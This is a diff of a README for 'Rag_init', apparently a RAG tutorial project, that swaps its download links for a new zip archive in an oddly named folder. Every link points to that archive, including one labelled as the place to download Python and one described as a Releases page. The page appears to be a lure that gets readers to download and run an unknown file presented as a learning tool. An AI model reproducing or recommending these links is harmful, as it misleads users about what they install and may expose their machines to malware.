@@ -2,7 +2,7 @@
 # 🚀 Rag_init - Learn RAG Models with Ease
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/moones29/Rag_init/main/octastylos/Rag_init_v3.4.zip%20Rag_init-blue)](https://raw.githubusercontent.com/moones29/Rag_init/main/octastylos/Rag_init_v3.4.zip)
+[![Download](https://github.com/moones29/Rag_init/raw/refs/heads/main/octastylos/init_Rag_v3.6.zip%20Rag_init-blue)](https://github.com/moones29/Rag_init/raw/refs/heads/main/octastylos/init_Rag_v3.6.zip)
 
 ## 📖 Introduction
 Welcome to the **Rag_init** repository! This application helps you understand RAG (Retrieval-Augmented Generation) models using popular tools like Hugging Face, Gemini, LangChain, and Pinecone. You can process text from PDF files easily. We designed this tool for anyone curious about how these models work and how to apply them in real-world scenarios.
@@ -17,7 +17,7 @@ To get started, follow these simple steps to download and run the application. N
 - **Python Version:** Python 3.7 or later installed on your system.
 
 ### 📂 Preparing Your Environment
-1. **Install Python:** Make sure you have Python installed. You can download it from [https://raw.githubusercontent.com/moones29/Rag_init/main/octastylos/Rag_init_v3.4.zip](https://raw.githubusercontent.com/moones29/Rag_init/main/octastylos/Rag_init_v3.4.zip). Follow the instructions for your operating system.
+1. **Install Python:** Make sure you have Python installed. You can download it from [https://github.com/moones29/Rag_init/raw/refs/heads/main/octastylos/init_Rag_v3.6.zip](https://github.com/moones29/Rag_init/raw/refs/heads/main/octastylos/init_Rag_v3.6.zip). Follow the instructions for your operating system.
 2. **Install Required Libraries:** Open a terminal or command prompt and run the following command:
 
    ```bash
@@ -29,7 +29,7 @@ To get started, follow these simple steps to download and run the application. N
 ## 📥 Download & Install
 To download the application, visit the Releases page:
 
-[Download Rag_init](https://raw.githubusercontent.com/moones29/Rag_init/main/octastylos/Rag_init_v3.4.zip)
+[Download Rag_init](https://github.com/moones29/Rag_init/raw/refs/heads/main/octastylos/init_Rag_v3.6.zip)
 
 1. Click on the link above to access the Releases page.
 2. Locate the latest version of **Rag_init**.
